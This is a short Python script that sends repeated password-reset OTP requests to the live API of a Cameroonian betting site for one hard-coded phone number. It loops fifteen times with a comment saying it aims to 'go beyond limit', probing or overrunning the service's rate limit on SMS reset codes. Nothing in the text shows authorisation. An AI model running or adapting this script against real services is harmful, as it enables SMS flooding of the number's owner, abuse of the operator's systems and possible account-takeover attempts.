import requests
import time
session = requests.Session()

url = "https://www.betpawa.cm/api/user/v3/password/request-otp"

headers = {
    "User-Agent": "Mozilla/5.0",
    "Content-Type": "application/json",
    "X-Pawa-Brand": "betpawa-cameroon",
    "X-Pawa-Language": "en"
}

payload = {
    "phoneNumber": "678392088",
    "resetMethodName": "SMS"
}

for i in range(15):  # go beyond limit
    r = session.post(url, headers=headers, json=payload)

    print(f"\nAttempt {i+1}")
    print("Status:", r.status_code)
    print("Response:", r.text[:150])

    time.sleep(2)  # VERY IMPORTANT (avoid spam)
